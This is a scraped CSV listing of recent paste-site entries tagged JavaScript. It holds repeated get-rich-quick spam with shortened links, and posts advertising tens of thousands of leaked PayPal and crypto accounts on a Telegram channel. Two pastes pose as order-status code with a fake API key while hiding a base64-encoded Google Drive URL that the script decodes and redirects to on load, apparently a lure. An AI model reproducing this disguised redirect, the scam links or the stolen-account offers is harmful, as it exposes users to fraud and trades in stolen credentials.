id,title,username,language,date,content
t8506d75,EARN $900 INSTANTLY 2025⭐ WF,Aximos1315,JavaScript,Wednesday 23rd of April 2025 07:06:45 AM CDT," 
Pdf https://tinyurl.com/privguidee


bpg2XQg1HP
"
9cT9qFQZ,Order.js,jm33,JavaScript,Wednesday 23rd of April 2025 06:58:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47898/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
716BXR7y,Crypto Accounts,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:57:31 AM CDT,37316 Accounts Posted On https://t.me/leakedbyeminem
ymRuTvtS,Make $1000 15-MINUTES  (BEGINNER) KB,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:57:27 AM CDT," 
Pdf https://tinyurl.com/privguidee


Hod9gmkM1g
"
PufgFEbg,EARN $900 INSTANTLY 2025 TA,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:48:11 AM CDT," 
Pdf https://tinyurl.com/privguidee


Yh9QaiIkSw
"
b8nmnH61,PayPal with Balance,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:42:07 AM CDT,79632 Accounts Posted On https://t.me/leakedbyeminem
Z1pdfgDi,Make $1000 15-MINUTES (BEGINNER) 14,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:38:57 AM CDT," 
Pdf https://tinyurl.com/privguidee


9i6UCw2GZc
"
eaT6mVXt,EARN $900 INSTANTLY 2025⭐ WF,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:29:40 AM CDT," 
Pdf https://tinyurl.com/privguidee


L2eqZE1LRd
"
GN17SGCC,Untitled,jm33,JavaScript,Wednesday 23rd of April 2025 06:27:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72973/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sPP0Jfeg,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:26:43 AM CDT,79158 Accounts Posted On https://t.me/leakedbyeminem
